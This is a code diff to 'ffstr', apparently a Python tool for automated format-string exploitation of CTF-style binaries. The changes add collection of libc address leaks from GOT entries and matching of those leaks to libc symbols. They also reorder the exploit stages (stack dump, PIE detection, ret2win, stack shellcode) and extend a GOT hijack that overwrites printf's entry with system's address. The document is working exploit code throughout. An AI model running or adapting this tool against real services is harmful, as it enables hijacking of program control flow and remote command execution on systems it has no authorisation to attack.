@@ -64,6 +64,9 @@ class ffstr():
 		# Dump binary
 		self.dump_name = None
 		
+		# Store libc leaks
+		self.leaks = None
+		
 		# Timeout between connection
 		self.timeout = None
 		
@@ -718,6 +721,11 @@ class ffstr():
 			print("Cannot Leak ...")
 			return
 		
+		# if no stack
+		if self.stack is None:
+			print("No stack data ...")
+			return
+		
 		# Lazy mode, don"t redo thing
 		if self.start is not None:
 			return
@@ -728,7 +736,7 @@ class ffstr():
 		self.start = []
 		
 		# Use previous acquired stack values for offset bruteforcing
-		for i,st in enumerate(self.stack):
+		for i, st in enumerate(self.stack):
 		
 			# Generate a set of offset to be tested
 			guessed = self.unOffset(st)
@@ -774,6 +782,11 @@ class ffstr():
 	
 		# Lazy mode, don't redo things
 		if self.pie is not None:
+			return
+		
+		# if no stack
+		if self.stack is None:
+			print("No stack data ...")
 			return
 			
 		# Gathering information
@@ -899,7 +912,7 @@ class ffstr():
 		
 		# Working on a stack copy
 		if self.elf is None:
-			print("No ELF as support ...")
+			print("No ELF as support, no symbol reading ...")
 			return
 		
 		# Choice
@@ -1042,10 +1055,16 @@ class ffstr():
 		# if we have access to the elf
 		if "ELF" in args.keys():
 			self.dump_name = args["ELF"]
+		else:
+			pass
 
 		# Dump opening
-		with open(self.dump_name,"rb") as fp:
-			data = fp.read()
+		try:
+			with open(self.dump_name,"rb") as fp:
+				data = fp.read()
+		except:
+			print("Use either ELF or DUMP argument ...")
+			return
 			
 		# Strings	
 		strings = [ elt[:-1] for elt in re.findall(b"([a-zA-Z0-9._-]{3,50}\x00)", data)]
@@ -1057,7 +1076,9 @@ class ffstr():
 		print(strings)
 		print("\nPlease do your best to identify the Libc, and use LIBC=your_libc_here.so\n")
 		
-		k=0
+		# Prepare leaks
+		self.leaks = []
+		
 		for plt,rip in got:
 		
 			# Get location
@@ -1083,21 +1104,31 @@ class ffstr():
 			left = data.find(self.delimiters[0])+len(self.delimiters[0])
 			right= data.find(self.delimiters[1])
 			dump =data[left:right]
-			print(">> ", hex(plt_got), dump[::-1].hex()[-2*self.block_byte:])
+			
+			# Saving
+			try:
+				self.leaks.append(int("0x"+dump[::-1].hex()[-2*self.block_byte:],16))
+			except:
+				self.leaks.append(0)
+			#print(">> ", hex(plt_got), dump[::-1].hex()[-2*self.block_byte:])
+		
+		# show leak
+		for j,elt in enumerate(self.leaks):
+			print("Index ",j," Leak ", hex(elt))
 		print("\n")
 			
 	
 	def hijackGOT(self):
 	
-		# Lazy mode, don't redo things
-		if self.libc is None:
-			return
-		
 		# Say hello
 		print("Perfom hard-way GOT hijack ...")
 		if not self.yesno():
 			return
 			
+		# Lazy mode, don't redo things
+		if self.libc is None:
+			self.libc = input("libc file >> ").strip()
+		
 		# Not clean, but does the work
 		self.libc = ELF(self.libc)
 		
@@ -1112,12 +1143,20 @@ class ffstr():
 		# Strings	
 		strings = [ elt[:-1] for elt in re.findall(b"([a-zA-Z0-9._-]{3,50}\x00)", data)]
 			
-		# Got address 
+		# Got address (plt,rip)
 		got = [ (elt,data.find(elt)) for elt in re.findall(b"\xff\x25....\x68", data)]
-			
+		
+		# show leak
+		for j,elt in enumerate(self.leaks):
+			for _ in self.libc.symbols.keys():
+				found = elt & 0xfff
+				extracted = self.libc.symbols[_] & 0xfff
+				if found == extracted and _ in ["puts","printf","system","__libc_start_main","fgets","gets"]:
+					print("Index ",j," Leak ", hex(elt),_)
+		
 		# puts
 		func = input("Which function to use for libc relocation (puts) ? ").strip()
-		entry = int(input("To which entry it correspod (0-N) ? :"))
+		entry = int(input("To which index it corresponds (0-N) ? :"))
 		
 		plt,rip = got[entry]
 		
@@ -1165,7 +1204,7 @@ class ffstr():
 			
 		# Overwrite printf
 		sys = base + self.libc.symbols["system"]
-		_entry = int(input("Which entry correspond to printf (0-N) ? :"))
+		_entry = int(input("Which index corresponds to printf (0-N) ? :"))
 		
 		# Write What Where
 		write={plt_got+(_entry-entry)*self.block_byte:sys}
@@ -1192,14 +1231,13 @@ def help():
 	BINARY          Link to the chall either as a path ./chall or url 127.0.0.1:1337
 	ELF             Link to the supporting elf file, path only
 	BITS            32 or 64 bits
-	TOUT		Timeout in seconds ex: 0.25
+	TOUT		Timeout in seconds ex: TOUT=0.25
+	RL		Rate limit, ask user after N request ex: RL=100
 	
 	Examples:
 	
-	python3 ffstr.py BINARY=127.0.0.1:1337 BITS=64 ELF=./ffstr64
-	python3 ffstr.py BINARY=127.0.0.1:1337 BITS=32 ELF=./ffstr32
-	python3 ffstr.py BINARY=./ffstr64 BITS=64 ELF=./ffstr64
-	python3 ffstr.py BINARY=./ffstr32 BITS=32 ELF=./ffstr32
+	python3 ffstr.py BINARY=127.0.0.1:1337 BITS=64 ELF=./lab/ffstr64
+	python3 ffstr.py BINARY=127.0.0.1:1337 BITS=32 ELF=./lab/ffstr32
 	""")
 if __name__ == "__main__":
 	
@@ -1212,14 +1250,14 @@ if __name__ == "__main__":
 	exploit = ffstr()
 	exploit.getArgs()
 	exploit.mentalist(nb_input=10)
-	exploit.stackDump(nb_elt=100)
+	exploit.stackDump(nb_elt=200)
 	exploit.stackAnalyze()
+	exploit.locateBinary()
+	exploit.PIE()
 	exploit.stackGPS()
 	exploit.calibrateStackWrite()
 	exploit.ret2win()
 	exploit.stackshellcode()
-	exploit.locateBinary()
-	exploit.PIE()
 	exploit.dumpBinary()
 	exploit.showSymbols()
 	exploit.vanillaGOT()
